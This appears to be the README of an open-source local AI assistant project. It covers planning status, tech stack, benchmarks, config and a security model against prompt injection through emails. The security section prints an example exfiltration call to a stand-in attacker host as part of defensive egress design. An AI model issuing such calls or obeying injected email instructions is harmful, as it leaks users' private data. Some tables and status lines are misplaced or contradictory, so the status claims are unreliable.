# Project Panini

**P.A.N.I.N.I.** — *Personal Assistant for Natural Information & Neural Interaction*

> A local-first, voice-driven AI personal assistant with a living avatar, intelligent output rendering, and deep integration into daily tools.

---

## Current Status

| Phase | Status |
|---|---|
| 00 — Discovery | ✅ Complete |
| 01 — BRD | ✅ Complete — 42 requirements, all traced |
| 02 — Solution Design | ✅ Complete |
| 03 — FRD | ✅ Complete — 131 requirements |
| 04 — HLD | ✅ Complete |
| 05 — LLD | ✅ **Complete — 9 documents** |
| 06 — Implementation | 🔄 **Stages 1–3 complete — runnable** |
| 07 — Testing | 🔲 Not Started |
| 08 — Release & Handover | 🔲 Not Started |

---

## What is Panini?

Panini is a Jarvis-style personal assistant that runs entirely on your local machine. You speak to it, it understands, acts on your behalf, and presents results in the most appropriate format — code, images, data tables, charts, or confirmable actions.

Named after **Pāṇini** (4th century BCE) — the ancient Indian grammarian who authored the *Aṣṭādhyāyī*, the world's first formal generative grammar and intellectual ancestor of modern NLP and language models.

### Key Capabilities (Planned)

- **Voice interaction** — Wake word ("Hey Panini"), hands-free, with interruption support
- **Animated avatar** — Live2D or VRM 3D character with lip-sync and emotion mapping
- **Smart output panels** — Code, images, video, data, charts, diagrams — each rendered appropriately
- **Tool connectors** — Gmail, Google Calendar, web search, filesystem, shell, browser
- **LLM-agnostic** — Swap between Ollama (local), OpenAI, Gemini, or Anthropic via config
- **Plugin system** — Extend with new tools and skills without touching core
- **Always-on daemon** — Lives in the system tray, always listening

---

## Technology Stack (Decided)

| Layer | Technology | Source |
|---|---|---|
| Desktop shell | Electron | — |
| Frontend UI | React + TypeScript | — |
| Backend | Python + FastAPI | — |
| Voice STT | faster-whisper `base` int8 — **CPU** | Open-LLM-VTuber |
| Voice TTS | Kokoro — **CPU** | Open-LLM-VTuber |
| Voice VAD | Silero VAD | Open-LLM-VTuber |
| Wake word | OpenWakeWord | **upstream** (Apache 2.0) |
| Avatar | VRM 3D primary (Live2D optional) | Naia OS / Open-LLM-VTuber |
| Tool registry | 34-tool base | Thoth |
| Plugin system | Manifest + ed25519 signed | **own impl** (Sapphire = design ref) |
| Security model | 4-tier T0–T3 | Naia OS |
| Event bus | asyncio pub/sub + SSE | **own impl** (Sapphire = design ref) |
| LLM backend | Factory — Ollama **≤7B Q4** default | Thoth providers |

---

## Project Structure

```
Project Panini/
├── README.md                          ← This file (updated as we go)
│
├── docs/                              ← All documentation (SDLC phases)
│   ├── 00_Discovery/                  ✅ Complete
│   │   ├── 01_Project_Charter/
│   │   │   ├── 01_Problem_Statement_and_Vision.md
│   │   │   └── 02_SDLC_Roadmap.md
│   │   ├── 02_Naming_and_Identity/
│   │   │   └── 01_Project_Naming_Research.md
│   │   ├── 03_OSS_Research/
│   │   │   └── 01_OSS_Repository_Analysis.md
│   │   └── 04_Design_Decisions/
│   │       ├── 01_Framework_Comparison_Analysis.md
│   │       ├── 02_Decision_Register.md      ← SOURCE OF TRUTH for all decisions
│   │       ├── 03_License_Audit.md          ← ⚠️ Sapphire = AGPL, do not copy
│   │       ├── 04_Hardware_Feasibility.md   ← ⚠️ 6 GB VRAM is the constraint
│   │       └── 05_Hardware_Validation_Results.md  ← measured, not estimated
│   │   └── 05_Security/
│   │       └── 01_Threat_Model.md           ← ⚠️ prompt injection & egress controls
│   ├── 01_BRD/                        ✅ Complete
│   │   └── 01_Business_Requirements_Document.md
│   ├── 02_Solution_Design/            ✅ Complete
│   │   └── 01_Solution_Design_Document.md
│   ├── 03_FRD/                        ✅ Complete
│   │   └── 01_Functional_Requirements_Document.md
│   ├── 04_HLD/                        ✅ Complete
│   │   └── 01_High_Level_Design.md
│   ├── 05_LLD/                        🔄 4 of 9 complete
│   │   ├── 00_LLD_Index.md
│   │   ├── 01_Security_Kernel_LLD.md   ← egress enumeration resolved
│   │   ├── 02_Voice_Pipeline_LLD.md    ← TTS cost knee; segmentation
│   │   ├── 03_Conversation_LLD.md      ← memory architecture (DO-002)
│   │   ├── 04_Tools_LLD.md             ← path safety; connector hardening
│   │   ├── 05_Frontend_LLD.md          ← approval dialog; visemes; memory view
│   │   ├── 06_Persistence_LLD.md       ← schemas; append-only triggers
│   │   ├── 07_Configuration_LLD.md     ← panini.yaml; security floor
│   │   └── 08_Plugin_System_LLD.md     ← sandbox isolation
│   ├── 06_Implementation/
│   ├── 07_Testing/
│   └── 08_Release/
│
└── src/                               ← All source code (populated from LLD onwards)
```

---

## OSS Modules Being Harvested

| Source | Stars | What We Take |
|---|---|---|
| [Open-LLM-VTuber](https://github.com/Open-LLM-VTuber/Open-LLM-VTuber) | ⭐ 13.5k | Full ASR / TTS / VAD pipeline, Live2D avatar, WebSocket server |
| [Thoth](https://github.com/arorakrishh/Thoth) | Growing | 34 tools (Gmail, Calendar, search, shell, filesystem), LLM providers |
| [Sapphire](https://github.com/ddxfish/sapphire) | ⭐ 276 | 🔴 **AGPL-3.0 — design reference only, no code copied** |

### Sourcing classification (DD-006a)

Reuse is classified per component, not lumped together:

| Class | Count | Meaning |
|---|---|---|
| **DEPENDENCY** | 9 | Installed from a registry, unmodified — upstream fixes flow automatically |
| **FORK** | 3 | Gmail, Calendar, Web search — commit SHA recorded, changes marked |
| **REIMPLEMENT** | 8 | Written by us — includes shell, filesystem, and the security kernel |
| **REFERENCE** | rest | Studied only, no code taken |

Code actually copied drops from ~23 modules to **3**. Security-critical components are always REIMPLEMENT — they must not inherit unreviewed behaviour.
| [Naia OS](https://github.com/tladus-git/naia-os) | Early | VRM avatar, 4-tier security model, audit log, daemon architecture |

---

## Governance Rule

> Every requirement, component, and line of code in later phases **must trace back to a decision ID** in [`docs/00_Discovery/04_Design_Decisions/02_Decision_Register.md`](docs/00_Discovery/04_Design_Decisions/02_Decision_Register.md).
>
> Anything that cannot trace back is either an error or a **new decision** — and must be added to the register with rationale before it is built.

---

## Decision Log

| Date | Decision |
|---|---|
| 2026-09-08 | Project name finalised: **Project Panini** |
| 2026-09-08 | Desktop framework: **Electron** (over Tauri 2) |
| 2026-09-08 | LLM strategy: **Factory pattern, Ollama local default** |
| 2026-09-09 | Avatar: **VRM 3D primary, Live2D as config option** — Jarvis aesthetic, free VRoid Hub models, proven Naia OS stack |
| 2026-09-09 | 🔴 **Sapphire code copying PROHIBITED** — AGPL-3.0 would infect entire codebase. Design reference only. |
| 2026-09-09 | Plugin system, event bus, personas, audio devices → **own implementation** (+3–5 days, removes copyleft risk) |
| 2026-09-09 | Workload placement: **STT + TTS on CPU, LLM + avatar on GPU** — 6 GB VRAM cannot host all four |
| 2026-09-09 | Local LLM constrained to **≤7B params @ Q4** (Qwen 2.5 7B / Mistral 7B) |
| 2026-09-09 | STT model **`small` → `base`** — `small` failed latency (2.31 s vs ≤1.5 s target) |
| 2026-09-09 | TTS requires **warm-up + sentence chunking** — naive TTFA was 8.83 s on long replies |
| 2026-09-09 | 🔧 Out-of-scope IDs renumbered **DD-100–105 → DX-001–006** (ID collision fixed) |
| 2026-09-09 | 🔐 **Threat model produced** — taint tracking + egress control added (DD-110–117) |
| 2026-09-09 | Text input at **full parity** with voice (DD-035) |

---

## 🚀 Running it

```bash
python -m panini --config config/panini.yaml chat     # interactive session
python -m panini --config config/panini.yaml health   # provider + tool status
python -m panini --config config/panini.yaml audit    # recent tool invocations
```

Requires Ollama running with `qwen2.5:7b-instruct-q4_K_M` pulled.

📋 **[Testing guide](docs/06_Implementation/02_Testing_Guide.md)** — 15 minutes, what to try and what to report.

### Implementation status

Delivered in **user-testable increments** rather than complete stages (DD-157) — five defects in Stages 1–3 passed the test suite and were found only by running the system.

| # | Increment | Status |
|---|---|---|
| 1–3 | Security kernel · tools · providers · memory | ✅ **testable now** |
| 4a | TTS — it speaks | 🔲 next |
| 4b | STT + push-to-talk | 🔲 |
| 4c | Wake word + VAD — hands-free | 🔲 |
| 7a | Web search | 🔲 |
| 7b | Gmail | 🔲 |
| 5a | Electron window | 🔲 |
| 6a | VRM avatar | 🔲 |
| 8a | Plugin sandbox | 🔲 |

**138 tests**, all in `tests/security/` — every one asserts the system *refuses* or *escalates* rather than that a happy path works.

### Provider options

| Auth | Providers |
|---|---|
| **None** (local) | Ollama |
| **API key** | OpenAI · Anthropic · Google · OpenRouter · Groq · any OpenAI-compatible endpoint |
| **OAuth** | Azure OpenAI (Entra ID) · Google user accounts · enterprise gateways |

All three share one `AuthStrategy` interface, so provider code never branches on which is in use.

---

## ✅ Validated Performance (measured 2026-09-09)

Benchmarked on the target machine — see [`05_Hardware_Validation_Results.md`](docs/00_Discovery/04_Design_Decisions/05_Hardware_Validation_Results.md).

| Metric | Estimated | **Measured** |
|---|---|---|
| LLM throughput (Qwen 7B Q4) | 15–25 tok/s | **35.26 tok/s** ✅ |
| LLM placement | partial CPU offload expected | **100% GPU** ✅ |
| Peak VRAM (concurrent) | ~5.5 GB | **4,857 MiB** (1,287 MiB spare) ✅ |
| Avatar frame time | assumed adequate | **0.39 ms** (2.3% of 60 FPS budget) ✅ |
| Avatar VRAM on RTX | 0.5–0.6 GB | **0 MiB** — runs on iGPU ✅ |
| Max context at 100% GPU | not estimated | **16,384 tokens** ✅ |
| STT latency, 3 s utterance | ≤1.5 s | **0.75 s** (`base`) ✅ / 2.31 s (`small`) ❌ |
| TTS time-to-first-audio | ≤0.7 s | **0.31–0.70 s** (with chunking) ✅ |
| **End-to-end, wake word → speech** | **2–4 s** | **≈2.8 s** ✅ *(incl. VAD end-pointing)* |

**Local-first confirmed viable.** All GPU metrics exceeded estimates; two decisions (STT model, TTS chunking) were corrected by measurement.

### Validated production config

```yaml
llm:
  model: qwen2.5:7b-instruct-q4_K_M
  num_gpu: 29        # forces 100% GPU — worth +60% throughput
  num_ctx: 8192      # 4,857 MiB, 1,287 MiB headroom
  keep_alive: 5m
renderer:
  prefer_integrated_gpu: true   # keeps discrete VRAM for the LLM
voice:
  stt: { model: base, compute_type: int8, device: cpu }   # base, NOT small
  tts:
    engine: kokoro
    device: cpu
    warm_on_start: true      # cold call costs 1.76s vs 0.30s warm
    chunk_max_chars: 65      # sentence-split, then clause-split
```

> **STT model note:** `small` was the original choice but **failed validation** — 2.31 s for a 3 s utterance against a ≤1.5 s target. `base` achieves **0.75 s**, 3.1× faster, and `small`'s marginal accuracy gain still doesn't transcribe "Panini" correctly.
>
> **TTS chunking note:** `kokoro-onnx`'s streaming API yields only **one chunk**, so naive time-to-first-audio scales with reply length (8.83 s on a long reply). Sentence-level chunking cuts it to **0.38 s**. Chunks must also be *uniform* — uneven sizes caused a 1.7 s audible gap despite healthy aggregate throughput.

---

## ⚠️ Known Constraints

| Constraint | Impact |
|---|---|
| **6 GB VRAM** (RTX 3050 Laptop) | Binding limit — confirmed: a 14B model collapses to 3.63 tok/s. Local LLM capped at ~7–8B Q4. |
| **Ollama auto-placement is conservative** | Leaves ~1.8 GB VRAM unused. `num_gpu` must be set explicitly. |
| **iGPU rendering is default, not guaranteed** | A Windows/Electron GPU flag could push rendering onto the RTX and reclaim 0.6 GB. Must be pinned. |
| **Sapphire is AGPL-3.0** | No code may be copied. Reimplementation required (~3–5 days). |
| **Live2D SDK is proprietary** | Free for individuals; paid above ¥20M JPY revenue. VRM preferred. |
| **Laptop thermals** | Sustained inference throttles. Plan for plugged-in operation. |
| **Prompt injection is a live threat** | Any inbox email is attacker-authored input to an assistant holding shell + email-send. Mitigated by taint tracking (DD-111) + egress control (DD-112); residual risk consciously accepted (DD-117). |

---

## 🔐 Security Model

Two distinct risk classes, two distinct control sets:

| Risk class | Question | Controls |
|---|---|---|
| **User-initiated** | "Should this action need approval?" | 4-tier T0–T3 permissions (DD-060–064) + audit log |
| **Content-initiated** | "What if the email is telling the assistant what to do?" | Provenance tagging (DD-110), **taint tracking (DD-111)**, egress classification (DD-112) |

**The load-bearing control is DD-111.** Once a turn touches retrieved content, every write/execute tool needs explicit approval — enforced in code, not dependent on the model refusing an injected instruction.

**DD-112 exists because tier-based thinking misses one thing:** `fetch https://attacker.com/log?data=<your emails>` reads as a *retrieval*, but it's exfiltration. Any tool that can move data off-machine is gated as egress regardless of its tier.

See [`01_Threat_Model.md`](docs/00_Discovery/05_Security/01_Threat_Model.md) — 17 threats, 9 controls, residual risk stated explicitly.
| 2026-09-08 | STT: **faster-whisper** (local) |
| 2026-09-08 | TTS: **Kokoro** (local) |
| 2026-09-08 | Wake word: **OpenWakeWord** |
| 2026-09-08 | Build strategy: **Harvest OSS modules, not build from scratch** |

---

*Last updated: 2026-09-08 — Discovery phase complete.*
